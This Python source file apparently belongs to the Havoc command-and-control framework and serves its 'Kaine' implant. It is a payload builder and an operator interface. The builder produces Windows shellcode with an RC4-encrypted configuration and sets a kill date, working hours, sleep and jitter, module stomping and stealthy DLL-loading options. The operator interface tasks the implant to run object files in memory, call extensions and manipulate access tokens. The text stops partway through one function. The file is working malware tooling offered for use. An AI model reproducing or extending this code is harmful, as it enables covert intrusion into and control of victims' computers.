import uuid

import hexdump
import pyhavoc

import PySide6
from PySide6.QtCore import *
from PySide6.QtGui import *
from PySide6.QtWidgets import *

import time
import base64
import argparse
import shlex
import random
import string

from os.path import exists
from struct import pack, unpack, calcsize
from Crypto.Cipher import ARC4
from Crypto.Random import get_random_bytes

KAINE_COMMANDS  : list = []
KAINE_MODULES   : dict = dict([(k, []) for k in range(3)])

@pyhavoc.agent.HcAgentExport
class KnPacker:
    def __init__(self):
        self.buffer  : bytes = b''
        self.size    : int   = 0

    def build( self ) -> bytes:
        return pack( "<L", self.size ) + self.buffer

    def add_string(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size   += calcsize(fmt)

    def add_wide_string(self, s):
        if s is None:
            s = ''
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size   += calcsize(fmt)

    def add_raw( self, r ):
        self.buffer += pack( "<{}s".format( len( r ) ), r )
        self.size   += len( r )

    def add_bytes( self, b ):
        if b is None:
            b = b''
        fmt = "<L{}s".format( len( b ) )
        self.buffer += pack( fmt, len( b ), b )
        self.size   += calcsize( fmt )

    def add_u8( self, u8 ):
        self.buffer += pack( '<B', u8 )
        self.size   += 1

    def add_u16( self, u16 ):
        self.buffer += pack( '<H', u16 )
        self.size   += 2

    def add_u32( self, u32 ):
        self.buffer += pack( '<L', u32 )
        self.size   += 4

    def add_u64( self, u64 ):
        self.buffer += pack( '<Q', u64 )
        self.size   += 8

class KnConfig( KnPacker ):

    def __init__( self ):
        super().__init__()
        self.rc4_key : bytes = b''
        return

    def build( self ) -> bytes:
        buffer = self.buffer

        if len( self.rc4_key ) != 0:
            cipher = ARC4.new( self.rc4_key )
            buffer = cipher.encrypt( buffer )

        return pack( "<L", self.size ) + buffer

    def arc4_key( self, key ):
        self.rc4_key = key

@pyhavoc.ui.HcUiBuilderRegisterView( "Kaine" )
class HcKaineBuilder( pyhavoc.ui.HcPayloadView ):

    def __init__( self, *args, **kwargs ):
        self.LdrFlagDll         = 1 << 0
        self.LdrFlagKnownDll    = 1 << 0
        self.LdrFlagMapView     = 1 << 0
        self.LdrFlagMapBuffer   = 1 << 0
        self.LdrFlagZeroHeader  = 1 << 0
        self.LdrFlagExistCheck  = 1 << 0
        self.registered_modules = []

        super().__init__( *args, **kwargs )

    ##
    ## main function to be executed
    ## should create the widgets inputs
    ## for the payload builder
    ##
    def main( self, widget: PySide6.QtWidgets.QWidget ):

        self.set_builder_size( 700, 600 )

        self.grid_main = QGridLayout(widget)
        self.grid_main.setObjectName(u"grid_main")
        self.grid_main.setSizeConstraint(QLayout.SetDefaultConstraint)
        self.grid_main.setVerticalSpacing(6)
        self.label_listener = QLabel(widget)
        self.label_listener.setObjectName(u"label_listener")

        self.combo_listener = QComboBox(widget)
        self.combo_listener.setObjectName(u"combo_listener")

        self.group_settings = QGroupBox(widget)
        self.group_settings.setObjectName(u"group_settings")
        self.gridLayout_3 = QGridLayout(self.group_settings)
        self.gridLayout_3.setObjectName(u"gridLayout_3")
        self.grid_settings = QGridLayout()
        self.grid_settings.setObjectName(u"grid_settings")
        self.label_workhour = QLabel(self.group_settings)
        self.label_workhour.setObjectName(u"label_workhour")

        self.input_sleep = QLineEdit(self.group_settings)
        self.input_sleep.setObjectName(u"input_sleep")
        self.input_sleep.setValidator(QIntValidator())

        self.combo_moduleldr = QComboBox(self.group_settings)
        self.combo_moduleldr.setObjectName(u"combo_moduleldr")

        self.time_starthour = QTimeEdit(self.group_settings)
        self.time_starthour.setObjectName(u"time_starthour")
        self.time_starthour.setDisplayFormat("HH:mm")
        self.time_starthour.setTime( QTime( 9, 00 ) )

        self.input_jitter = QLineEdit(self.group_settings)
        self.input_jitter.setObjectName(u"input_jitter")
        self.input_jitter.setValidator(QIntValidator())

        self.label_moduleldr = QLabel(self.group_settings)
        self.label_moduleldr.setObjectName(u"label_moduleldr")

        self.check_killdate = pyhavoc.ui.HcSwitch(self.group_settings)
        self.check_killdate.setObjectName(u"check_killdate")

        self.datetime_killdate = QDateTimeEdit(self.group_settings)
        self.datetime_killdate.setObjectName(u"datetime_killdate")
        self.datetime_killdate.setTimeSpec( PySide6.QtCore.Qt.TimeSpec.LocalTime )
        self.datetime_killdate.setCalendarPopup( True )
        self.datetime_killdate.setDateTime( PySide6.QtCore.QDateTime.currentDateTime() )
        self.datetime_killdate.setDisplayFormat( "dd-MMM-yyyy hh:mm:00" )

        self.check_workhour = pyhavoc.ui.HcSwitch(self.group_settings)
        self.check_workhour.setObjectName(u"check_workhour")

        self.label_killdate = QLabel(self.group_settings)
        self.label_killdate.setObjectName(u"label_killdate")

        self.time_endhour = QTimeEdit(self.group_settings)
        self.time_endhour.setObjectName(u"time_endhour")
        self.time_endhour.setDisplayFormat("HH:mm")
        self.time_endhour.setTime( QTime( 17, 00 ) )

        self.label_sleep = QLabel(self.group_settings)
        self.label_sleep.setObjectName(u"label_sleep")

        self.label_stomping = QLabel(self.group_settings)
        self.label_stomping.setObjectName(u"label_stomping")

        self.input_stomping = QLineEdit(self.group_settings)
        self.input_stomping.setObjectName(u"input_stomping")

        self.gridLayout_3.addLayout(self.grid_settings, 0, 0, 1, 1)

        self.label_arch = QLabel(widget)
        self.label_arch.setObjectName(u"label_arch")

        self.combo_format = QComboBox(widget)
        self.combo_format.setObjectName(u"combo_format")

        self.grid_main.setColumnStretch(1, 1)
        self.grid_main.setColumnMinimumWidth(0, 126)

        self.combo_arch = QComboBox(widget)
        self.combo_arch.setObjectName(u"combo_arch")

        self.label_format = QLabel(widget)
        self.label_format.setObjectName(u"label_format")

        self.group_options = QGroupBox( widget )
        self.group_options.setObjectName(u"group_options")

        self.layout_options = QFormLayout( self.group_options )
        self.layout_options.setObjectName( u"layout_options" )

        self.grid_main.addWidget(self.label_listener, 0, 0, 1, 1)
        self.grid_main.addWidget(self.combo_listener, 0, 1, 1, 1)
        self.grid_main.addWidget(self.label_arch,     1, 0, 1, 1)
        self.grid_main.addWidget(self.combo_arch,     1, 1, 1, 1)
        self.grid_main.addWidget(self.label_format,   2, 0, 1, 1)
        self.grid_main.addWidget(self.combo_format,   2, 1, 1, 1)
        self.grid_main.addWidget(self.group_settings, 3, 0, 1, 2)
        self.grid_main.addWidget(self.group_options,  4, 0, 1, 2)

        self.grid_settings.addWidget(self.label_killdate,    0, 0, 1, 1)
        self.grid_settings.addWidget(self.datetime_killdate, 0, 2, 1, 2)
        self.grid_settings.addWidget(self.check_killdate,    0, 1, 1, 1)
        self.grid_settings.addWidget(self.label_workhour,    1, 0, 1, 1)
        self.grid_settings.addWidget(self.check_workhour,    1, 1, 1, 1)
        self.grid_settings.addWidget(self.time_starthour,    1, 2, 1, 1)
        self.grid_settings.addWidget(self.time_endhour,      1, 3, 1, 1)
        self.grid_settings.addWidget(self.label_sleep,       2, 0, 1, 1)
        self.grid_settings.addWidget(self.input_sleep,       2, 2, 1, 1)
        self.grid_settings.addWidget(self.input_jitter,      2, 3, 1, 1)
        self.grid_settings.addWidget(self.combo_moduleldr,   3, 2, 1, 2)
        self.grid_settings.addWidget(self.label_moduleldr,   3, 0, 1, 1)
        self.grid_settings.addWidget(self.label_stomping,    4, 0, 1, 1)
        self.grid_settings.addWidget(self.input_stomping,    4, 2, 1, 2)

        self.label_listener.setText(QCoreApplication.translate("Form", u"Listener:", None))
        self.group_settings.setTitle(QCoreApplication.translate("Form", u"Settings:", None))
        self.label_workhour.setText(QCoreApplication.translate("Form", u"Work Hour:", None))
        self.label_moduleldr.setText(QCoreApplication.translate("Form", u"Module Loading:", None))
        self.check_killdate.setText("")
        self.check_workhour.setText("")
        self.label_killdate.setText(QCoreApplication.translate("Form", u"Kill Date:", None))
        self.label_sleep.setText(QCoreApplication.translate("Form", u"Sleep/Jitter:", None))
        self.label_stomping.setText(QCoreApplication.translate("Form", u"Stomping (Plugin):", None))
        self.label_arch.setText(QCoreApplication.translate("Form", u"Arch:", None))
        self.label_format.setText(QCoreApplication.translate("Form", u"Format:", None))
        self.group_options.setTitle(QCoreApplication.translate("Form", u"Options:", None))

        self.set_defaults()

        ##
        ## TODO: when the operator changes the protocol erase the options
        ##       widget and re-execute every module and protocol
        ##
        self.combo_listener.currentTextChanged.connect(self.refresh_modules)
        self.refresh_modules()

        return

    def protocol_module( self, listener_type: str ):
        for ModulePriority in KAINE_MODULES.values():
            for ModuleClass in ModulePriority:
                module = ModuleClass()

                if len( listener_type ) == 0 and len( module.protocol() ) == 0:
                    continue

                if module.protocol() == listener_type:
                    return ModuleClass

        return None

    def refresh_modules(
        self
    ) -> None:
        ##
        ## clean up previous options and modules
        ##
        self.registered_modules = []
        for i in reversed(range(self.layout_options.count())):
            self.layout_options.itemAt(i).widget().deleteLater()

        ##
        ## add protocol module
        ##
        if self.combo_listener.currentText() != '(no listener available)':
            listener_type      = pyhavoc.core.HcListenerQueryType( self.combo_listener.currentText() )
            listener_interface = self.protocol_module( listener_type )

            if listener_interface is not None:
                module = listener_interface()
                module.interface( self.layout_options )

        ##
        ## add feature and extensions
        ##
        for ModulePriority in KAINE_MODULES.values():
            for ModuleClass in ModulePriority:
                ##
                ## if no the current module is not related to
                ## protocol and transportation then ignore it
                ## as we already added it first
                ##
                module = ModuleClass()
                if module.protocol() == "":
                    module.interface( self.layout_options )

                ##
                ## register the module in the order of the priority
                ##
                self.registered_modules.append( module )

        return


    def set_defaults(self) -> None:

        self.combo_listener.clear()
        listeners = pyhavoc.core.HcListenerAll()
        if len( listeners ) == 0:
            self.combo_listener.addItem( "(no listener available)" )
            self.combo_listener.setEnabled( False )
        else:
            for i in listeners:
                self.combo_listener.addItem( i )

        self.combo_arch.clear()
        self.combo_arch.addItem( "x64" )
        self.combo_arch.addItem( "x86" )

        self.combo_format.clear()
        self.combo_format.addItem( "Windows Shellcode" )

        self.input_sleep.setText( "5" )
        self.input_jitter.setText( "10" )

        self.combo_moduleldr.clear()
        self.combo_moduleldr.addItem( "LdrLoadDll" )
        self.combo_moduleldr.addItem( "RtlRegisterWait( LoadLibraryW )" )
        self.combo_moduleldr.addItem( "RtlCreateTimer( LoadLibraryW )" )
        self.combo_moduleldr.addItem( "RtlQueueWorkItem( LoadLibraryW )" )
        self.combo_moduleldr.addItem( "TpAllocWork( LoadLibraryW )" )
        self.combo_moduleldr.addItem( "NtMapViewOfSection" )
        self.combo_moduleldr.addItem( "NtAllocateVirtualMemory" )

        return

    ##
    ## sanity check the given input
    ## return:
    ##  true  -> successful checked the input and nothing is wrong
    ##  false -> failed to check and something went wrong
    ##
    def sanity_check( self ) -> bool:
        return True

    ##
    ## pressing "Generate" action
    ##
    def generate( self ) -> dict:

        working_hour: int = 0
        kill_date   : int = 0

        ##
        ## if specified pack the working hours into a single integer
        ##
        if self.check_workhour.isChecked():
            start_hour    = self.time_starthour.time().hour()
            start_minutes = self.time_starthour.time().minute()
            end_hour      = self.time_endhour.time().hour()
            end_minutes   = self.time_endhour.time().minute()

            working_hour  = 0
            working_hour |= 1 << 22
            working_hour |= ( start_hour    & 0b011111 ) << 17
            working_hour |= ( start_minutes & 0b111111 ) << 11
            working_hour |= ( end_hour      & 0b011111 ) << 6
            working_hour |= ( end_minutes   & 0b111111 ) << 0

        if self.check_killdate.isChecked():
            kill_date = self.datetime_killdate.dateTime().toSecsSinceEpoch()

        ##
        ## return the configuration as a json package
        ##
        return {
            "listener": self.combo_listener.currentText(),
            "arch"    : self.combo_arch.currentText(),
            "format"  : self.combo_format.currentText(),

            "core": {
                "sleep"     : int( self.input_sleep.text() ),
                "jitter"    : int( self.input_jitter.text() ),
                "kill date" : kill_date,
                "work hour" : working_hour,
                "stomping"  : self.input_stomping.text()
            }
        }

    ##
    ## pressing "Save Profile" action
    ##
    def profile_save( self ) -> dict:
        pass

    ##
    ## pressing "Load Profile" action
    ##
    def profile_load( self, profile: dict ) -> bool:
        pass

    ##
    ## payload has been generated, and we are going to process it here.
    ## this method is going to actually process the retrieved payload
    ## by including the configuration, modules and commands and other
    ## features.
    ##
    def payload_process(
        self,
        payload: bytes,
        context: dict
    ) -> bytes:
        """
        process payload with the given context configuration

        :param payload:
            kaine core payload

        :param context:
            context configuration

        :return:
            processed payload ready to use
        """
        config       : KnConfig = KnConfig()
        modules      : KnPacker = KnPacker()
        arc4_key     : bytes    = get_random_bytes( 16 )
        arc4_pat     : bytes    = b'{KAINE-ARC4-KEY}'
        magic_val    : bytes    = b'5pdr'
        flags        : int      = 0
        exec_flag    : int      = 0

        config.arc4_key( arc4_key )

        print( context )

        ##
        ## [core] config:
        ##  [ magic value  ] u32 // this indicates if the configuration has been successfully decrypted
        ##  [ flags        ] u32
        ##  [ kill date    ] u32
        ##  [ work hour    ] u32
        ##  [ sleep        ] u32
        ##  [ jitter       ] u32
        ##  [ exec flags   ] u8
        ##  [ exec module  ] wstring
        ##  [ libraries    ] array<u8>
        ##    [ advapi32 flag ] u8
        ##  [ ext config   ] array<[length, bytes]>
        ##

        config.add_raw( magic_val )
        config.add_u32( flags )
        config.add_u32( context[ 'implant' ][ 'core' ][ 'kill date' ] )
        config.add_u32( context[ 'implant' ][ 'core' ][ 'work hour' ] )
        config.add_u32( context[ 'implant' ][ 'core' ][ 'sleep'     ] )
        config.add_u32( context[ 'implant' ][ 'core' ][ 'jitter'    ] )
        config.add_u8( exec_flag )
        config.add_wide_string( context[ 'implant' ][ 'core' ][ "stomping" ] )

        ##
        ## modules flags
        ##

        ##
        ## advapi32.dll
        ##
        config.add_u8( self.LdrFlagDll )

        ##
        ## process modules and configuration
        ##
        for module in self.registered_modules:
            ##
            ## only add it when the module code has been returned
            ##
            extension = module.module()
            if len( extension ) > 0:
                ##
                ## add the module configuration to
                ## the agent config if specified
                ##
                configuration = module.configuration( context )
                if len( configuration ) == 0:
                    packer = KnPacker()
                    config.add_raw( packer.build() )
                else:
                    config.add_raw( configuration )

                ##
                ## add the config code to the extensions list
                ##
                modules.add_bytes( extension )

        ##
        ## replace the key inside the kaine
        ## payload with the generated one
        ##
        payload = payload.replace( arc4_pat, arc4_key )

        ##
        ## Kaine implant format:
        ##
        ##   [ kaine agent ]
        ##   [ modules     ]
        ##      [ size   ]
        ##      [ ------ ]      Usually the first few modules are more prioritized when it comes to
        ##      [ size   ]      communication, core behaviour changes such as diff way of resolving
        ##      [ module ]      functions and mapping of libraries.
        ##      [ ------ ]
        ##      [ size   ]
        ##      [ module ]
        ##       ...
        ##   [ config      ]
        ##       ...
        ##
        payload += modules.build()
        payload += config.build()

        return payload

class HcKaineCommand:
    pass

@pyhavoc.agent.HcAgentExport
class KnParser:

    def __init__(
        self,
        buffer: bytes
    ):
        self.buffer: bytes = buffer

        return

    def length( self ) -> int:
        return len( self.buffer )

    def parse_int( self ) -> int:
        if self.length() < 4:
            return 0

        val = unpack( "<I", self.buffer[ :4 ] )
        self.buffer = self.buffer[ 4: ]

        return val[ 0 ]

    def get_u8( self ) -> int:
        return unpack( "<B", self.parse_pad( 1 ) )[ 0 ]

    def get_u16( self ) -> int:
        return unpack( "<H", self.parse_pad( 2 ) )[ 0 ]

    def get_u32( self ) -> int:
        return unpack( "<L", self.parse_pad( 4 ) )[ 0 ]

    def get_u64( self ) -> int:
        return unpack( "<Q", self.parse_pad( 8 ) )[ 0 ]

    def get_wide_str( self ) -> str:
        return self.parse_bytes().decode( 'utf-16le' ).rstrip('\x00')

    def get_str( self ):
        return self.parse_str()

    def parse_bytes( self ) -> bytes:
        return self.parse_pad( self.parse_int() )

    def parse_pad( self, length: int ) -> bytes:
        if self.length() < length:
            return b''

        buf         = self.buffer[ :length ]
        self.buffer = self.buffer[ length: ]

        return buf

    def parse_str( self ) -> str:
        return self.parse_bytes().decode( 'utf-8' )

@pyhavoc.agent.HcAgentExport
class KnObjectModule:

    def __init__(
        self,
        agent,
        object     : any,
        function   : str   = "",
        *args,
        data       : bytes = b'',
        obfuscate  : bool  = False,
        veh_dbg    : bool  = False,
        object_uuid: int   = 0,
        pass_return: bool  = False
    ):
        self.__agent    = agent
        self.__object   = object
        self.__handle   = 0
        self.__status   = ""
        self.__error    = ""
        self.__return   = ""
        self.__uuid     = 0
        self.__obj_uuid = object_uuid

        buffer = b''
        packer = KnPacker()

        ##
        ## check if the object parameter is an
        ## byte array to be loaded by the agent
        ##
        if type( object ) == bytes:

            if len(args) > 0:
                for i in args:
                    if type( i ) == int:
                        packer.add_u32( i )
                    elif type( i ) == str:
                        packer.add_string( i )
                    elif type( i ) == bytes:
                        packer.add_bytes( i )

                buffer = packer.build()

            if len(data) > 0:
                buffer = data

            ##
            ## task the kaine agent to
            ## load the object file into memory
            ##
            ctx = self.__agent.object_execute(
                self.__object,
                entry=function,
                parameters=buffer,
                is_module=True,
                wait_to_finish=True,
                object_uuid=object_uuid,
                pass_return=pass_return
            )

            self.__status = ctx[ 'status' ]
            self.__uuid   = ctx[ 'task-uuid' ]

            if ctx[ 'status' ] == "STATUS_SUCCESS":
                self.__handle = ctx[ 'handle' ]
                self.__return = ctx[ 'return' ].decode( 'utf-8' )
            else:
                self.__error = ctx[ 'return' ].decode( 'utf-8' )

        else:
            self.__handle = object
            self.__status = 'STATUS_SUCCESS'

        return

    def uuid( self ) -> int:
        return self.__uuid

    def object_uuid( self ) -> int:
        return self.__obj_uuid

    def handle( self ) -> int:
        return self.__handle

    def error( self ) -> str:
        return self.__error

    def data( self ) -> str:
        return self.__return

    def status( self ) -> str:
        return self.__status

    def invoke(
        self,
        function,
        *args,
        data       : bytes  = b'',
        object_uuid: int    = 0,
        pass_return: bool   = True,
        callback   : object = None
    ) -> dict:

        packer = KnPacker()
        buffer: bytes    = b''

        if self.status() != 'STATUS_SUCCESS':
            return {
                "error": self.error()
            }

        if len(args) > 0:

            for i in args:
                if type( i ) == int:
                    packer.add_u32( i )
                elif type( i ) == str:
                    packer.add_string( i )
                elif type( i ) == bytes:
                    packer.add_bytes( i )

            buffer = packer.build()

        if len(data) > 0:
            buffer = data

        ctx = self.__agent.object_execute(
            object=self.handle(),
            parameters=buffer,
            entry=function,
            wait_to_finish=True,
            object_uuid=object_uuid,
            pass_return=pass_return,
            callback=callback
        )

        self.__status = ctx[ 'status' ]
        self.__uuid   = ctx[ 'task-uuid' ]

        if ctx[ 'status' ] == "STATUS_SUCCESS":
            self.__return = ctx[ 'return' ]
        else:
            self.__error = ctx[ 'return' ].decode( 'utf-8' )

        return ctx

    def free( self ):

        ctx = self.__agent.object_free( self.handle(), wait_to_finish=True )

        self.__status = ctx[ 'status' ]
        self.__uuid   = ctx[ 'task-uuid' ]

        if self.__status != "STATUS_SUCCESS":
            self.__error = ctx[ 'return' ].decode( 'utf-8' )

        return


class HcTableDict( dict ):

    def __init__( self, kaine_agent ):
        super( HcTableDict, self ).__init__()
        self.kaine = kaine_agent

    def __setitem__(self, key, item):
        self.kaine.key_set( key, item )

    def __getitem__(self, key):
        return self.kaine.key_get( key )

    def __delitem__(self, key):
        self.kaine.key_delete( key )

    def has_key(self, key):
        return self.kaine.key_exist( key )

    def __contains__(self, item):
        return self.kaine.key_exist( item )


@pyhavoc.agent.HcAgentRegisterInterface( "Kaine" )
class HcKaine( pyhavoc.agent.HcAgent ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.key_store = HcTableDict( self )

        return

    def console_error( self, text ):
        self.console_print( "%x[%D %T]%$ %r[-]%$ " + text )
        return

    def console_log( self, text, type="info" ):
        self.agent_execute( {
            "command": "KnConsole",
            "arguments": {
                "type"   : type,
                "output" : text
            }
        }, True )

        return

    def console_input( self, text, local_only=False ):
        if local_only is True:
            self.console_print( "" )
            self.console_print( "%x[%D %T]%$ %pKaine%$ %c>>>%$ " + text )
        else:
            self.agent_execute( {
                "command": "KnConsole",
                "arguments": {
                    "type"   : "input",
                    "output" : text
                }
            }, True )

        return

    def input_dispatch( self, input: str ):
        ##
        ## setup available commands
        ##
        commands       = shlex.split( input )
        kaine_commands = []

        if len( commands ) == 0:
            return

        for KnTaskObject in KAINE_COMMANDS:
            kaine_commands.append( KnTaskObject( self ) )

        if commands[ 0 ].lower() == "help":
            largest_name_length = 0

            self.console_print( "" )
            self.console_print( "%x[%D %T]%$ %pKaine%$ %c>>>%$ " + input )
            self.console_print( "" )
            self.console_print( " Kaine Commands" )
            self.console_print( " ==============" )
            self.console_print( "" )

            ##
            ## find the largest command name
            ##
            for i in kaine_commands:
                if len(i.command) >= largest_name_length:
                    largest_name_length = len(i.command)

            self.console_print( f"   Command{' ' * (largest_name_length - 7)}   Description" )
            self.console_print( f"   -------{' ' * (largest_name_length - 7)}   -----------" )

            for i in kaine_commands:
                self.console_print( f"   {i.command + ' ' * (largest_name_length - len(i.command))}   {i.description}" )

            self.console_print( "" )
        else:
            found = False

            for i in kaine_commands:
                if commands[ 0 ] == i.command:

                    parsed_args = i._args_handle( commands )
                    if parsed_args is not None:

                        if i.min_args <= ( len( commands ) - 1 ):
                            self.console_input( input )
                            i.execute( parsed_args )
                        else:
                            usage = i.parser.format_usage()
                            self.console_input( input, local_only=True )
                            self.console_print( usage[ :len( usage ) - 1 ] )

                    found = True

            if found is False:
                self.console_input( input, local_only=True )
                self.console_error( f"invalid command: {input}" )

        return

    def key_get( self, key: str ) -> any:
        return self.agent_execute( {
            "command"   : "KnStoreGet",
            "arguments" : {
                "key": key
            },
        }, True )[ 'result' ]

    def key_set( self, key: str, val: any ) -> any:
        self.agent_execute( {
            "command"   : "KnStoreSet",
            "arguments" : {
                "key"   : key,
                "value" : val
            },
        }, True )

    def key_exist( self, key: str ) -> bool:
        return self.agent_execute( {
            "command"   : "KnStoreExist",
            "arguments" : {
                "key"   : key,
            },
        }, True )[ 'result' ]

    def key_delete( self, key: str ) -> None:
        self.agent_execute( {
            "command"   : "KnStoreDelete",
            "arguments" : {
                "key"   : key,
            },
        }, True )

    def task_generate(
        self,
    ) -> int:
        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskGenerate",
        }, True )

        return resp[ 'task-uuid' ]

    def task_read(
        self,
        task_uuid: int
    ) -> bytes:

        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskRead",
            "arguments": {
                "task-uuid": task_uuid
            }
        }, True )

        return base64.b64decode( resp[ 'read' ] )

    def task_exist(
        self,
        task_uuid: int
    ) -> bool:
        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskExist",
            "arguments": {
                "task-uuid": task_uuid
            }
        }, True )

        return resp[ 'exist' ]

    def task_delete(
        self,
        task_uuid: int
    ) -> bytes:

        ##
        ## try to generate task uuid
        ##
        resp = self.agent_execute( {
            "command": "KnTaskDelete",
            "arguments": {
                "task-uuid": task_uuid
            }
        }, True )

        return resp[ 'success' ]

    def traffic(self) -> tuple[int, int]:
        ##
        ## remove the callback from the server
        ##
        resp = self.agent_execute( {
            "command": "KnTraffic"
        }, True )

        return resp[ 'send' ], resp[ 'received' ]

    def callback_remove(
        self,
        callback_uuid: str
    ):
        ##
        ## remove the callback from the client
        ##
        pyhavoc.agent.HcAgentUnRegisterCallback( callback_uuid )

        ##
        ## remove the callback from the server
        ##
        self.agent_execute( {
            "command": "KnCallbackRemove",
            "arguments": {
                "callback-uuid": callback_uuid
            }
        }, True )

    def object_module(
        self,
        object     : any,
        function   : str   = "",
        *args,
        data       : bytes = b'',
        obfuscate  : bool  = False,
        veh_dbg    : bool  = False,
        object_uuid: int   = 0,
        pass_return: bool  = False
    ) -> KnObjectModule:

        return KnObjectModule(
            agent=self,
            object=object,
            function=function,
            *args,
            data=data,
            obfuscate=obfuscate,
            veh_dbg=veh_dbg,
            object_uuid=object_uuid,
            pass_return=pass_return
        )

    def object_free(
        self,
        handle         : int,
        wait_to_finish : bool = False,
        task_uuid      : int  = 0,
    ) -> dict:
        return self.agent_execute( {
            "command":   "IoObjectControl",
            "arguments": {
                "object"   : handle,
                "free"     : True,
                "task-uuid": task_uuid
            }
        }, wait_to_finish )

    def object_execute(
        self,
        object        : any,
        entry         : str    = "go",
        parameters    : any    = b'',
        is_module     : bool   = False,
        base_address  : int    = 0,
        wait_to_finish: bool   = False,
        object_uuid   : int    = 0,
        task_uuid     : int    = 0,
        callback      : object = None,
        pass_return   : bool   = False
    ) -> dict:
        """
        execute an object file in memory

        :param object:
            object file bytes to load and execute in memory
            or object file handle that already has been loaded
            into memory

        :param entry:
             entry point function name to execute after
             loading the object file into memory

        :param parameters:
            arguments to pass to the entry point function

        :param is_module:
            if this argument is set to true then the object file
            won't be released from memory and is going to return
            the handle/address of the object file for further
            function invocation.
            be aware that if this flag is specified it is going
            to block the current execution and wait til the file
            has been loaded into memory to return the handle.

        :param base_address:
            base address of where to write the object file to.
            can be ann address from a stomped module or virtual
            private memory.

        :param wait_to_finish:
            wait til the execution of the bof finished

        :param object_uuid
            object uuid that is going to be passed to the object file function

        :param task_uuid
            tasking id to use for the execution of the object file

        :param callback
            callback to call for intput

        :param pass_return
            pass return buffer to the invoked function name

            by default the entry point is going to have this proto-type

            ```c
            VOID Function( PVOID Argv, ULONG Argc, ULONG PacketUuid, KnSelf )
            ```

            after enabling pass_return it is going to change the proto-type to

            ```c
            VOID Function( PVOID Argv, ULONG Argc, PBUFFER Buffer )
            ```

        :return:
            status of executing the object file
        """

        wait          : bool = wait_to_finish
        resp          : dict = {}
        obj           : any  = None
        callback_uuid : str  = ''

        ##
        ## we have to wait til we receive back the
        ## handle of the object file in memory
        ##
        if is_module:
           wait = True

        if type( object ) == bytes:
            obj = base64.b64encode( object ).decode( 'utf-8' )
        elif type( object ) == int:
            obj = object
        else:
            return {
                "status": -1,
                "return": "object is not a byte array or handle"
            }

        ##
        ## register callback
        ##
        if callback is not None:
            callback_uuid = "Kaine-" + str( uuid.uuid4() )
            pyhavoc.agent.HcAgentRegisterCallback( callback_uuid, callback )

        ##
        ## task the agent to invoke an object file
        ##
        resp = self.agent_execute( {
                "command":   "IoObjectControl",
                "arguments": {
                    "object"        : obj,
                    "entry"         : entry,
                    "args"          : base64.b64encode( parameters ).decode( 'utf-8' ),
                    "module"        : is_module,
                    "address"       : base_address,
                    "object-uuid"   : object_uuid,
                    "task-uuid"     : task_uuid,
                    "callback-uuid" : callback_uuid,
                    "pass-return"   : pass_return,
                }
            },
            wait
        )

        ##
        ## if there is something to parse then
        ## lets parse it and return it
        ##
        if wait_to_finish is True:
            if "return" in resp:
                resp[ "return" ] = base64.b64decode( resp[ "return" ].encode( 'utf-8' ) )

        return resp

    def extension_execute(
        self,
        command        : int,
        *args,
        callback       : object = None,
        wait_to_finish : bool   = True
    ) -> tuple[bytes, int]:
        """
        executes a loaded module/extension

        :param command:
            module command id

        :param args:
            arguments to pass to the module/extension

        :param callback:
            callback function to invoke

        :param wait_to_finish:
            if we should wait for the function to finish executing

        :return:
            returning a tuple -> (data, task-uuid)

            data:
                data returned from the extensions

            task-uuid
                uuid of task
        """
        status        : int      = 0
        ret           : bytes    = b''
        task_uuid     : int      = 0
        packer        : KnPacker = KnPacker()
        callback_uuid : str      = ''

        ##
        ## pack arguments
        ##
        for i in args:
            if type( i ) == int:
                packer.add_u32( i )
            elif type( i ) == str:
                packer.add_string( i )
            elif type( i ) == bytes:
                packer.add_bytes( i )

        ##
        ## register callback
        ##
        if callback is not None:
            callback_uuid = "Kaine-" + str( uuid.uuid4() )
            pyhavoc.agent.HcAgentRegisterCallback( callback_uuid, callback )

        ##
        ## task the agent to invoke an object file
        ##
        ctx = self.agent_execute( {
                "command":   "IoModuleControl",
                "arguments": {
                    "control"      : "execute",
                    "command"      : command,
                    "arguments"    : packer.buffer,
                    "callback-uuid": callback_uuid,
                }
            },
            wait_to_finish
        )

        ##
        ## if there is something to parse then
        ## lets parse it and return it
        ##
        if wait_to_finish is True:
            if 'error' in ctx:
                raise Exception( ctx[ 'error' ] )

            if 'status' in ctx:
                if ctx[ 'status' ] == 'STATUS_NOT_FOUND':
                    raise Exception( 'received STATUS_NOT_FOUND meaning the specified command has not been registered' )

                if ctx[ 'status' ] != 'STATUS_SUCCESS':
                    raise Exception( ctx[ 'status' ] )

            if "return" in ctx:
                ret = base64.b64decode( ctx[ "return" ].encode( 'utf-8' ) )

        return ret, ctx[ 'task-uuid' ]

    def token_uid(
        self,
        token_handle  : int  = 0,
        wait_to_finish: bool = True
    ) -> tuple[str, bool, int]:
        """
        get the token uid name and elevation status

        :param token_handle:
            token to get uid from and its elevation status

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (uid, elevated, task-uuid)

            uid:
                the uid string (utf-16le) that has been
                retrieved from the specified or current token

            elevated:
                elevation status of the current or specified token

            task-uuid
                uuid of task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"     : "uid",
                "token-handle": token_handle
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        task = ctx[ 'task-uuid' ]
        ctx  = ctx[ 'return' ]

        return ctx[ 'uid' ], ctx[ 'is_admin' ], task

    def token_revert(
        self,
        wait_to_finish: bool = True
    ) -> tuple[bool, int]:
        """
        revert current impersonated thread token to itself

        :param wait_to_finish:
            should wait for returned data (default: true)
             
        :return: 
            returning a tuple -> (reverted, task-uuid)
            
            reverted: 
                status if the thread token has been reverted to itself

            task-uuid:
                uuid of task
        """
        
        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control": "revert",
            }
        }, wait_to_finish )

        if 'error' in ctx:
